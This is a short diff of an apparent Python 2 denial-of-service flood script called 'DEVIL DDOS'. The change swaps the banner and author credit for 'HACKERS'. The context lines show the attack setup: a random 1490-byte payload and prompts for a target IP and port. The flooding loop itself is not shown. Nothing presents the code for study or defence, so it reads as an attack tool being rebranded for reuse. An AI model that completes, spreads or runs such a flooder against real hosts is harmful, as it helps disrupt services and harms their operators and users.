@@ -20,10 +20,9 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DEVIL DDOS")
 print
-print "Author   : Anonymous Devil"
-print "You Tube : https://www.youtube.com/channel/UCetPBjdtKQMh1l4Ogt2buxQ"
-print "DEVIL DDOS"
-print "==================Anonymous DEVIL=========="
+print "Author   : HACKERS"
+print "hackers DDOS"
+print "================== hackers ddos =========="
 print
 ip = raw_input("IP  : ")
 port = input("Port  : ")
